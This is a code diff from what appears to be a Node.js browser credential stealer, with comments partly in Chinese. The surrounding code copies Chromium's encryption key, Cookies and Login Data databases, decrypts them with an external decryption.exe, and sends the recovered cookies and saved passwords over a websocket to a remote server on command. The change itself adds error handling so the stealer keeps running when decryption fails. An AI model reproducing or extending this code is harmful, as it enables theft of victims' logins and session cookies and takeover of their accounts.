@@ -4,7 +4,7 @@
  * @Autor: solid
  * @Date: 2022-11-03 17:21:06
  * @LastEditors: solid
- * @LastEditTime: 2022-11-09 17:44:23
+ * @LastEditTime: 2022-11-10 16:41:34
  */
 var { hostname, port, room, reconnectInterval } = require("../wsConfig/config.js")
 const os = require('os');
@@ -103,26 +103,36 @@ async function generateJson(filename, filePath) {
             break
     }
     fs.writeFileSync("chromiumKey", fs.readFileSync(getchromiumKeyPath));
-    await exec(`decryption.exe  "${filePath}" "${filename}"`)
+    try {
+        await exec(`decryption.exe  "${filePath}" "${filename}"`)
+        return false
+    } catch (error) {
+        return true
+    }
+
 }
 //获取加密信息  cookie和密码
 async function GetDecrypeInfo(name) {
     switch (name) {
         case "cookie":
             var filePath = path.join(getDefaultProfile(), "Network\\Cookies")
-            await generateJson(name, filePath)
+            var err = await generateJson(name, filePath)
             break;
         case "password":
             var filePath = path.join(getDefaultProfile(), "Login Data")
-            await generateJson(name, filePath)
+            var err = await generateJson(name, filePath)
         default:
             break;
     }
     fs.unlinkSync("chromiumKey")
     fs.unlinkSync(name)
-    var res = JSON.parse(fs.readFileSync(`result/${name}.json`))
-    fs.unlinkSync(`result/${name}.json`)
-    return res
+    if (!err) {
+        var res = JSON.parse(fs.readFileSync(`result/${name}.json`))
+        fs.unlinkSync(`result/${name}.json`)
+        return res
+    }
+    return []
+
 }
 
 function BrowserConnect(wsName) {
@@ -164,7 +174,7 @@ function BrowserConnect(wsName) {
             case "cookie":
                 res = await GetDecrypeInfo(data.operation)
                 if (data.operation == "password") {
-                    fs.writeFileSync("Favicons", fs.readFileSync(path.join(getDefaultProfile(), "Favicons")));
+                    fs.writeFileSync(`Favicons`, fs.readFileSync(path.join(getDefaultProfile(), "Favicons")));
                     var faviconDB = sqlite3("Favicons")
                     res = res.map((item) => {
                         sql = `select * from favicons JOIN icon_mapping on icon_mapping.icon_id = favicons.id and page_url = ?`;
@@ -183,6 +193,8 @@ function BrowserConnect(wsName) {
                 break;
         }
         browserWs.send(JSON.stringify({ operation: data.operation, data: res }))
+    })
+    browserWs.on('error', function () {
     })
     browserWs.on('close', function () {
         console.log(' Browser 连接断开!!! Browser 等待重连');
